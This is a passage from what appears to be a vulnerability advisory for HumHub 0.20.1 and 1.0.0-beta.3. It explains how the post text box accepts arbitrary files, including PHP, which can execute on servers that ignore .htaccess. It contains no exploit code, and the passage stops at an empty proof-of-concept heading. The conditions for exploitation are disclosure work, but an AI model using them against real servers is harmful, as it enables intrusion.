2. Overview

HumHub is a social media platform written in PHP. In version 0.20.1 as well as
1.0.0-beta.3, it is vulnerable to Code Execution as some functionality allows
the uploading of PHP files. Successfull exploitation requires specific server
settings. A user account is required as well, but registration is open by
default.

3. Details

CVSS: High 7.6 AV:N/AC:H/Au:N/C:C/I:C/A:C

Most of the file uploads of HumHub check the file extension or file type before
uploading a file. However, the file upload of the "What's on your mind?"-text
box allows upload of arbitrary files.

A htaccess file forbids the execution of PHP code in uploaded files, but some
servers are configured to not read htaccess files. This is for example the case
with default Apache configurations. Because of this, uploaded files should be
checked to not have dangerous file extensions.

An account is needed, but the registration is open by default.

An admin does have the option to configure what files are allowed here: http://
localhost/humhub-0.20.0/index.php?r=admin%2Fsetting%2Ffile. But by default, all
files are allowed (although .htaccess is renamed).

It should also be noted that the documentation specifically mentions that the
upload directory needs to be protected. However, it is to be assumed that not
all users follow this suggestion, especially as there is no warning in the
installation process itself.

Proof of Concept:
